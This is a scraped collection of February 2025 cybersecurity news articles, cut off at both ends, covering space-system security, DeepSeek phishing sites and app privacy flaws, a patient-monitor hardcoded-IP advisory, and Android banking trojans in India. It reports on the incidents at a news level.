has focused on organizational and terrestrial cybersecurity, but the focus on cyber protection for space-based systems and communications is relatively recent. In 2019 and 2023, NASA issued its first guidelines to secure spacecraft, such as the Orion Multi-Purpose Crew Vehicle, but has not incorporated the requirements into its acquisition policies, according to a 2024 report by the US Government Accounting Office.\nIn addition, NASA needs trusted suppliers that also know the provenance of their hardware and software, says Space ISAC's Visner.\n\"Particular attention should be paid to the increasingly global and commoditized supply chain of hardware and software that comprises our space systems,\" he says. \"Industry should recognize — and it appears many industry leaders do recognize — that the systems they produce for the public and private sectors are potential adversary targets.\"\nA few weeks into the second Trump administration, experts are split on whether cybersecurity will be a focus in the push to ramp up the United States' efforts in space.\nOn one hand, the Trump administration has not stated a policy for current space efforts nor announced initiatives to secure space-based systems, but then NASA already issued a best-practices guide for securing space systems in 2023.\n\"It's worth noting that Space Policy Directive 5 (SPD-5), which described the principles for the cybersecurity of space systems, was promulgated by President Trump's first administration, while the subsequent Biden administration pursued implementation of this directive,\" Visner explains. \"So, we can expect additional, and perhaps increased emphasis, as the new administration shapes its efforts.\"\nCalPoly's Lin, however, is a bit more pessimistic about the chances for more stringent cybersecurity requirements for space-based infrastructure and the commercial contractors that manufacture components for those devices and vehicles.\n\"It's really anyone's guess how all this will play out, and that uncertainty doesn't give much confidence that space cybersecurity will be strengthened,\" he says. \"[It] takes real work and coordination — discipline, competence, safety cultures, [and] international and industry cooperation. In the absence of governmental leadership, it may be up to the space industry to watch their own cyber-backs, which unfortunately doesn't bode well for national security.\"\nRead more about:\nRobert Lemos, Contributing Writer\n\nVeteran technology journalist of more than 20 years. Former research engineer. Written for more than two dozen publications, including CNET News.com, Dark Reading, MIT's Technology Review, Popular Science, and Wired News. Five awards for journalism, including Best Deadline Journalism (Online) in 2003 for coverage of the Blaster worm. Crunches numbers on various trends using Python and R. Recent reports include analyses of the shortage in cybersecurity workers and annual vulnerability trends.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nFrost Radar: Cloud Security Posture Management, 2024\n6 Key Requirements of Multicloud Security\nSecure remote access. Simplified.\nDriving the Future of Work Through Enterprise-Wide SASE\nUnderstanding Social Engineering Attacks and What To Do About Them\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "DeepSeek Phishing Sites Pursue User Data, Crypto Wallets",
        "Link": "https://www.darkreading.com/cyber-risk/deepseek-phishing-sites-pursue-user-data-crypto-wallets",
        "Summary": "Riding the wave of notoriety from the Chinese company's R1 AT chatbot, attackers are spinning up lookalike sites for different malicious use cases.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nRiding the wave of notoriety from the Chinese company's R1 AT chatbot, attackers are spinning up lookalike sites for different malicious use cases.\nFebruary 6, 2025\nMore than two weeks after China's DeepSeek garnered worldwide attention with its low-cost AI model, threat actors have been busy capitalizing on the news by setting up phishing sites impersonating the company.\nThe fraudulent sites aim to deceive users into downloading malicious software or providing credentials and other sensitive information. Researchers at Israel-based Memcyco spotted at least 16 such sites actively impersonating DeepSeek earlier this week and believe the activity represents a coordinated attack campaign among threat actors.\n\"Memcyco observed clusters of fake domains registered in waves, often adjusting their content and branding dynamically and in real time, based on how DeepSeek's website was being perceived and positioned in the market,\" says Israel Mazin, CEO and co-founder of Memcyco. \"Some sites even changed their attack methods based on these trends to cater to what would be most effective.\" In some cases, the threat actors displayed remarkable agility by shifting their infrastructure to new locations and configurations to dodge takedown attempts, he says.\nDozens of phishing sites have popped up since DeepSeek released its free R1 AI chatbot on Jan. 20. Although many of these sites have been taken down, slow response times from some hosting providers, domain registrars, and other intermediaries continue to give phishing operators a window of opportunity to target users interested in exploring DeepSeek with fake websites.\nUsers that engage with these sites risk identity theft, financial fraud, and malware infection, Mazin says. Some sites even intercept login credentials in real-time, enabling account takeovers. Others distribute malware that allows remote access to users' devices, putting personal and corporate data at risk. \"These attacks are especially dangerous when new, exciting, and hyped-up tools are launched, such as DeepSeek, and users are not yet familiar with the website or platform,\" he adds.\nOthers have reported on the threat as well. In a blog post last week, Cyble, for instance, said its researchers had spotted DeepSeek lookalike domains designed to trick users into believing they had landed on the real site. Some of the sites had links to cryptocurrency scams and others to fraudulent investment scams like one touting a nonexistent DeepSeek pre-IPO sale. The DeepSeek-linked cryptocurrency scam site attempted to lure site visitors into scanning a QR code that essentially opened the way for the threat actor to empty their crypto wallets. Another site that Cyble inspected attempted to lure unsuspecting users into purchasing a fake DeepSeekAI Agent crypto token. \n\"As DeepSeek continues to gain global recognition, cybercriminals are capitalizing on its popularity to launch phishing campaigns, fake investment scams, and fraudulent cryptocurrency schemes,\" Cyble noted.\nFraudulent websites are not the only concern. Innovative threat actors have found other ways to take advantage of the huge interest around DeepSeek. Researchers from Positive Technologies recently spotted two malicious packages labeled \"deepseekai\" and \"deepseeek\" on the popular PyPI Python package repository. The packages were targeted at developers and organizations seeking to integrate DeepSeek into their systems and gave its authors a way to steal information from environments where they had been downloaded.\nMany of the phishing sites that Memcyco observed appeared to fit the pattern of phishing-as-a-service (PhaaS) operators that sell impersonation \"phish kits\" to fraudsters, Mazin notes. \"This could include organized cybercriminal groups, state-backed hackers, or even immature phishers, all with financial or espionage motives.\"\nThe surge in malicious activity surrounding DeekSeek is typical for major news events. It is a reminder of the need for users to be cautious when approaching new, popular hyped-up services. That means extra vigilance for strange URLs with misspelled words or unprofessional website designs, Mazin advises. \"Domain registrars and social media platforms must be proactive in monitoring when new domains and profiles are being registered or created,\" he says. \"Businesses and organizations should improve scam detection [and] takedowns and deploy real-time digital impersonation protection capabilities to safeguard their users.\"\nJai Vijayan, Contributing Writer\n\nJai Vijayan is a seasoned technology reporter with over 20 years of experience in IT trade journalism. He was most recently a Senior Editor at Computerworld, where he covered information security and data privacy issues for the publication. Over the course of his 20-year career at Computerworld, Jai also covered a variety of other technology topics, including big data, Hadoop, Internet of Things, e-voting, and data analytics. Prior to Computerworld, Jai covered technology issues for The Economic Times in Bangalore, India. Jai has a Master's degree in Statistics and lives in Naperville, Ill.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nDelivering Globally Consistent App Performance to the Hybrid Workforce\nSecure remote access. Simplified.\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nUnderstanding Social Engineering Attacks and What To Do About Them\nSolution Brief: Introducing the runZero Platform\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "Agencies Sound Alarm on Patient Monitors With Hardcoded Backdoor",
        "Link": "https://www.darkreading.com/vulnerabilities-threats/agencies-sound-alarm-patient-monitors-hardcoded-backdoor",
        "Summary": "CISA and the FDA are warning that Contec CMS8000 and Epsimed MN-120 patient monitors are open to meddling and data theft; Claroty Team82 flagged the vulnerability as an avoidable insecure design issue.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nCISA and the FDA are warning that Contec CMS8000 and Epsimed MN-120 patient monitors are open to meddling and data theft; Claroty Team82 flagged the vulnerability as an avoidable insecure design issue.\nFebruary 6, 2025\nLast week, the Cybersecurity and Infrastructure Security Agency (CISA), alongside the US Food and Drug Administration (FDA), raised an alert for Contec CMS8000 and Epsimed MN-120 healthcare monitors, warning they potentially put patients at risk once connected to the Internet, due to a malicious, hidden backdoor embedded into the devices. But security researchers say the issue isn't actually intentional malware but, rather, just insecure design.\nThe devices continuously monitor patient vital signs, such as heart rate, blood oxygen saturation, temperature, respiration rate, and more. CISA and the FDA reported findings for three cybersecurity risks in the gear thanks to the \"backdoor\": an unauthorized user could remotely control a monitor and cause it to function in an unintended manner; attackers could compromise the device and pivot to a network; and an attacker could exfiltrate the data that the monitor collects. \nFrom a patient health perspective, if an attacker were able to manipulate the information the monitor gives patients, that could prevent them from realizing that there's something wrong. Though they reported no known cybersecurity incidents, deaths, or injuries related to the findings, the FDA still provided recommendations for patients and caregivers: talking to healthcare providers about evaluating their patient monitoring device and following certain steps if it does rely on an Internet connection.\nRelated:The Cyber Savanna: A Rigged Race You Can't Win, but Must Run Anyway\nThe FDA also tasked healthcare providers with checking their patients' Contec CMS8000 or Epsimed MN-120 patient monitors to determine if they have been functioning unusually.\nAfter learning of the alerts, Claroty's Team82 investigated the firmware and reached a different conclusion from CISA and the FDA: It is likely not a hidden backdoor that makes these devices a liability to patients and their medical information, but rather an insecure design that creates a vulnerability open for exploit by threat actors.\nThe researchers pointed out that the vendors, and any resellers interested in relabeling and selling the monitor publicly, list the IP address on the instruction manuals.\n\"The CONTEC operator manual specifically mentions this 'hard-coded' IP address as the central management system (CMS) IP address that organizations should use, so it is not hidden functionally as stated by CISA,\" wrote the Team82 researchers. \"This nuance is important because it demonstrates a lack of malicious intent and therefore changes the prioritization of remediation activities.\"\nRelated:How Are Modern Fraud Groups Using GenAI and Deepfakes?\nThe vulnerability still poses real-world consequences, but Noam Moshe, a Team82 researcher, notes that a threat actor would first require knowledge of the device's architecture and protocols. \n\"To gain code execution, first the device needs to be put on a system-upgrade process,\" says Moshe. \"From our research, this requires physical access to the device.\"\nAfter that though, the hardcoded nature of the IP address opens the door to easier exploitation.\n\"To exploit this vulnerability, an attacker would need to serve devices with malicious binaries on the hardcoded public IP address, giving them code execution on the device,\" Moshe says. \"In the case of the device trying to send personally identifiable information (PII) or personal health information (PHI) to the hardcoded IP address, using the HL7 protocol, this could occur if a certain feature of the device would be enabled.\"\nPerhaps exploitation of this particular vulnerability doesn't seem all that likely, but medical devices have been a point of cyber contention for years.\nAll the way back in 2011 for instance, Jay Radcliffe took to the Black Hat USA stage to show the audience how insulin pumps like the one he wore could be hacked, in a presentation entitled \"Hacking Medical Devices for Fun and Insulin: Breaking the Human SCADA System.\"\nRelated:Backline Tackles Enterprise Security Backlogs With AI\nAnd as healthcare institutions are ravaged by ransomware attacks compromising their resources and putting patient lives at risk, many medical devices still haven't caught up when it comes to bolstering cybersecurity guardrails. Specifically, many of them are aging and running legacy software that hasn't been updated in years, offering plenty of holes for attackers.\nHowever, agencies like the FDA are pushing companies to make strides, such as in 2023 when it began to reject medical devices that don't comply with recent cybersecurity regulation.\nBut there is still a long way to go: In 2024, researchers cited healthcare and the Internet of Medical Things (IoMT) as the riskiest device sector, even it did have the biggest decline overall in the number of risky devices deployed.\nAs for the patient monitor, Team82 researchers recommend that healthcare organizations take steps to protect patients, such blocking all access to the subnet from their internal network, and blocking devices attempting to upgrade firmware from a WAN server or potentially send PII.\n\"Hospitals should implement vulnerability detection and patching processes,\" Moshe says, \"alongside network segmentation, driven by high-quality passive visibility that will ensure the most secure network layout.\"\nKristina Beek, Associate Editor, Dark Reading\n\nSkilled writer and editor covering cybersecurity for Dark Reading.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nDelivering Globally Consistent App Performance to the Hybrid Workforce\nSecure remote access. Simplified.\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nUnderstanding Social Engineering Attacks and What To Do About Them\nSolution Brief: Introducing the runZero Platform\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "The Cyber Savanna: A Rigged Race You Can't Win, but Must Run Anyway",
        "Link": "https://www.darkreading.com/vulnerabilities-threats/cyber-savanna-rigged-race-you-cant-win-must-run-anyway",
        "Summary": "When it comes to protecting your company from cyberattacks, you don't have to be the fastest gazelle — you just can't afford to be the slowest.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nWhen it comes to protecting your company from cyberattacks, you don't have to be the fastest gazelle — you just can't afford to be the slowest.\nFebruary 6, 2025\nCOMMENTARY\nCybersecurity is a relentless, brutal, and unwinnable race. It's a savanna where organizations are gazelles and threat actors are cheetahs. There's no prize for coming first, no trophies for the fastest. It's actually simple: Run or be eaten. Harsh? Yes. But ignoring this reality won't save you. It'll make you the slowest gazelle.\nBlaming hackers for breaches is a sign of avoidance. Yes, they're relentless and innovate faster than most companies defend, but they're not the reason your systems are wide open. That's on you!\nYour real enemy is complacency. It's the decision to rely on the legacy tools you have because upgrading feels \"too disruptive.\" It's adopting buzzwords like \"shift-left security\" without empowering developers to act on it and saying it doesn't work. This isn't about being perfect. It's about not being the easiest target. And right now, too many organizations are making it too easy.\nShift-left security is pitched as the savior of modern AppSec. The promise? Catch vulnerabilities early in the development cycle when they're cheapest to fix and pose no immediate risk. The reality? Most organizations are implementing it wrong or not at all.\nLet's be honest: When did you last see a developer voluntarily ask security to review their code? Developers are under constant pressure to write code and deliver fast. Security is often seen as an obstacle, not an ally. The result? Insecure code makes it to production, and shift-left becomes just another buzzword.\nFor shift-left to work, it needs to be invisible and automated. It needs to be Integrated seamlessly into developer workflows. Anything less is just wishful thinking and a sure-fire way to alienate your dev teams.\nThe painful reality is that many organizations fall prey to cyberattacks exploiting vulnerabilities that were identified. Those vulnerabilities should have been patched years ago. As of 2024, more than 200,000 vulnerabilities have been identified, with more than 40,000 new ones disclosed in 2024 alone, marking a relentless upward trend.\nEven when focusing on the Cybersecurity and Infrastructure Security Agency's (CISA's) Known Exploited Vulnerabilities, a list of around 1,250 vulnerabilities actively used in real-world attacks, the industry's response paints a grim picture. According to Verizon's \"2024 Data Breach Investigations Report,\" only 15% of companies patch these vulnerabilities within the first 30 days of their inclusion on this critical list, and 8% remain unremediated even after a year.\nThis isn't about sophisticated zero-day exploits. Attackers often take the path of least resistance, targeting unpatched, well-documented vulnerabilities with a proven track record of success. The issue is compounded by overburdened security teams, constrained resources, and increasingly complex IT infrastructures, all of which make timely patching a challenge.\nIf you are slower, you will be breached. You could have prevented it, but due to complacency, misplaced priorities, or the inability to keep pace with the overwhelming number of vulnerabilities disclosed each year, you didn't.\nIf the race is unwinnable, what's the point? The point is this: You can make the race work for you. Survival isn't about perfection. It's about prioritization. It's about focusing on vulnerabilities that attackers can exploit in your environment and could significantly impact your organization. Concentrating your efforts here can make you a much tougher target, forcing attackers to move on to easier prey.\nThis isn't a race to fix everything; it's a race to focus on what matters. Smart prioritization is your edge.\nHere's the good news: While you can't \"win\" this race in the traditional sense, you can succeed within it. Winning isn't about fixing every vulnerability or stopping every attack. It's about managing risk effectively and making it harder for attackers to succeed.\nThe savanna may be brutal, but it rewards organizations that are resilient, adaptable, and focused on what matters most. By homing in on vulnerabilities that are critical risks to you based on their factual reachability, exploitability, and impact, you can deliver results without being overwhelmed by the sheer volume of threats.\nYes, cybersecurity is hard, and the odds are stacked against you. But you're not powerless. By embracing resilience, prioritizing critical vulnerabilities, and fostering collaboration across teams, you can make the race work for you.\nIn this savanna, you don't have to be the fastest gazelle. You just can't afford to be the slowest. So, run smart. Run strong. Focus on what matters. And whatever you do — don't stop.\nBoaz Barzel\nField CTO, OX Security\nBoaz Barzel is the field CTO at OX Security, specializing in bridging the gap between security, technology, and business. Boaz is aligning product innovation with the real-world needs of customers and is known for transforming complex security challenges into strategic business advantages. With extensive expertise in application security and product innovation, he ensures security solutions are not just reactive but also proactively address emerging threats. Boaz is helping organizations integrate security seamlessly into their operations. He excels in translating technical risks into clear, actionable insights, enabling product teams to develop solutions that drive business growth while strengthening security. A trusted adviser to executives and security leaders, Boaz has helped countless organizations implement security strategies that align with business goals. At OX Security, he shapes product strategy, influences the market, and drives customer success.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nFrost Radar: Cloud Security Posture Management, 2024\n6 Key Requirements of Multicloud Security\nSecure remote access. Simplified.\nDriving the Future of Work Through Enterprise-Wide SASE\nUnderstanding Social Engineering Attacks and What To Do About Them\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "Basket of Bank Trojans Defraud Citizens of East India",
        "Link": "https://www.darkreading.com/cyberattacks-data-breaches/bank-trojans-defraud-citizens-east-india",
        "Summary": "Cheap banking scams are often easier to pull off in a country with older devices, fewer regulations, and experienced fraudsters.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nBreaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa and the Asia Pacific\nCheap banking scams are often easier to pull off in a country with older devices, fewer regulations, and experienced fraudsters.\nFebruary 6, 2025\nA series of fake banking apps are making the rounds in India, mimicking trusted institutions to steal credentials and, ultimately, money.\nThe scale of the campaign is impressive, featuring nearly 900 different malware samples tied to around 1,000 different phone numbers used to perpetrate the fraud. Researchers from Zimperium observed all those malware couched in apps that mimic billion-dollar financial institutions, designed to target regular people across India.\nAcross India, regular people have been receiving WhatsApp messages carrying malicious Android Package Kit (APK) files. Once downloaded, these APKs open into fake apps mimicking one of more than a dozen banks, including most of the largest in India: HDFC Bank, ICICI Bank, the State Bank of India (SBL), and others.\nSource: Zimperium\nThe apps ask victims to submit their most sensitive financial information, including their mobile banking credentials, credit and debit card numbers, ATM PINs, Permanent Account Number (PAN) Card — used for various financial and government purposes, like paying taxes or opening a bank account — and Aadhar Card, and equivalent to a Social Security number (SSN).\nTo allow the attackers to log into victims' bank accounts, the malware intercepts one-time passwords sent via SMS, and redirects them either to an attacker-controlled phone number, or a command-and-control (C2) server running on Firebase.\nRelated:Russian APT Phishes Kazakh Gov't for Strategic Intel\nThe malware also sports stealth and anti-analysis measures, like \"packing,\" where the malware is compressed, encrypted, and obfuscated to the point of illegibility. It can install itself invisibly by taking advantage of accessibility services, and obtain all conceivable permissions on users' devices by simply prodding a user to thoughtlessly hit \"Allow\" when it asks nicely.\n\"Since you don't see the app, it's not easy to uninstall it,\" explains Nico Chiaraviglio, chief scientist at Zimperium. \"And then you [have to deal with the] higher permissions. So if you want to uninstall the app, the device will say you cannot install it because it's a system app. You basically need to connect the phone to a computer and uninstall it using the Android Debug Bridge (ADB). It's not something that you can do from a regular user's standpoint.\"\nPhone numbers tied to the campaign lovingly named \"FatBoyPanel\" have tended to concentrate in eastern states: West Bengal (30.2%), Bihar (22.6%), Jharkjand (10%).\nThat FatBoyPanel seems to be going so well, Chiaraviglio thinks, comes down to a couple of obvious factors. First: older, outdated phones are common in East India, and, \"If you want to run some sort of exploit, it's easier to do on older devices,\" he says.\nRelated:Chinese APT Group Is Ransacking Japan's Secrets\n\"It's also widely known that there are a lot of scammers in India,\" he adds. In this campaign, \"They are targeting some specific apps, and this basically tells you that the attackers are Indians, and that they know the market that they are working in.\"\nOne thing surprised him, he says: \"We publish a report every year on banking Trojans, and we see most of them targeting many different countries at the same time. It's very uncommon that we see a campaign that is only targeting one country.\"\nRead more about:\nNate Nelson, Contributing Writer\n\nNate Nelson is a writer based in New York City. He formerly worked as a reporter at Threatpost, and wrote \"Malicious Life,\" an award-winning Top 20 tech podcast on Apple and Spotify. Outside of Dark Reading, he also co-hosts \"The Industrial Security Podcast.\"\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nFrost Radar: Cloud Security Posture Management, 2024\n6 Key Requirements of Multicloud Security\nSecure remote access. Simplified.\nDriving the Future of Work Through Enterprise-Wide SASE\nUnderstanding Social Engineering Attacks and What To Do About Them\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "Experts Flag Security, Privacy Risks in DeepSeek AI App",
        "Link": "https://krebsonsecurity.com/2025/02/experts-flag-security-privacy-risks-in-deepseek-ai-app/",
        "Summary": "New mobile apps from the Chinese artificial intelligence (AI) company DeepSeek have remained among the top three \"free\" downloads for Apple and Google devices since their debut on Jan. 25, 2025. But experts caution that many of DeepSeek's design choices -- such as using hard-coded encryption keys, and sending unencrypted user and device data to Chinese companies -- introduce a number of glaring security and privacy risks.",
        "Date": "2025-02-06",
        "Content": "New mobile apps from the Chinese artificial intelligence (AI) company DeepSeek have remained among the top three “free” downloads for Apple and Google devices since their debut on Jan. 25, 2025. But experts caution that many of DeepSeek’s design choices — such as using hard-coded encryption keys, and sending unencrypted user and device data to Chinese companies — introduce a number of glaring security and privacy risks.\n\nPublic interest in the DeepSeek AI chat apps swelled following widespread media reports that the upstart Chinese AI firm had managed to match the abilities of cutting-edge chatbots while using a fraction of the specialized computer chips that leading AI companies rely on. As of this writing, DeepSeek is the third most-downloaded “free” app on the Apple store, and #1 on Google Play.\nDeepSeek’s rapid rise caught the attention of the mobile security firm NowSecure, a Chicago-based company that helps clients screen mobile apps for security and privacy threats. In a teardown of the DeepSeek app published today, NowSecure urged organizations to remove the DeepSeek iOS mobile app from their environments, citing security concerns.\nNowSecure founder Andrew Hoog said they haven’t yet concluded an in-depth analysis of the DeepSeek app for Android devices, but that there is little reason to believe its basic design would be functionally much different.\nHoog told KrebsOnSecurity there were a number of qualities about the DeepSeek iOS app that suggest the presence of deep-seated security and privacy risks. For starters, he said, the app collects an awful lot of data about the user’s device.\n“They are doing some very interesting things that are on the edge of advanced device fingerprinting,” Hoog said, noting that one property of the app tracks the device’s name — which for many iOS devices defaults to the customer’s name followed by the type of iOS device.\nThe device information shared, combined with the user’s Internet address and data gathered from mobile advertising companies, could be used to deanonymize users of the DeepSeek iOS app, NowSecure warned. The report notes that DeepSeek communicates with Volcengine, a cloud platform developed by ByteDance (the makers of TikTok), although NowSecure said it wasn’t clear if the data is just leveraging ByteDance’s digital transformation cloud service or if the declared information share extends further between the two companies.\nImage: NowSecure.\nPerhaps more concerning, NowSecure said the iOS app transmits device information “in the clear,” without any encryption to encapsulate the data. This means the data being handled by the app could be intercepted, read, and even modified by anyone who has access to any of the networks that carry the app’s traffic.\n“The DeepSeek iOS app globally disables App Transport Security (ATS) which is an iOS platform level protection that prevents sensitive data from being sent over unencrypted channels,” the report observed. “Since this protection is disabled, the app can (and does) send unencrypted data over the internet.”\nHoog said the app does selectively encrypt portions of the responses coming from DeepSeek servers. But they also found it uses an insecure and now deprecated encryption algorithm called 3DES (aka Triple DES), and that the developers had hard-coded the encryption key. That means the cryptographic key needed to decipher those data fields can be extracted from the app itself.\nThere were other, less alarming security and privacy issues highlighted in the report, but Hoog said he’s confident there are additional, unseen security concerns lurking within the app’s code.\n“When we see people exhibit really simplistic coding errors, as you dig deeper there are usually a lot more issues,” Hoog said. “There is virtually no priority around security or privacy. Whether cultural, or mandated by China, or a witting choice, taken together they point to significant lapse in security and privacy controls, and that puts companies at risk.”\nApparently, plenty of others share this view. Axios reported on January 30 that U.S. congressional offices are being warned not to use the app.\n“[T]hreat actors are already exploiting DeepSeek to deliver malicious software and infect devices,” read the notice from the chief administrative officer for the House of Representatives. “To mitigate these risks, the House has taken security measures to restrict DeepSeek’s functionality on all House-issued devices.”\nTechCrunch reports that Italy and Taiwan have already moved to ban DeepSeek over security concerns. Bloomberg writes that The Pentagon has blocked access to DeepSeek. CNBC says NASA also banned employees from using the 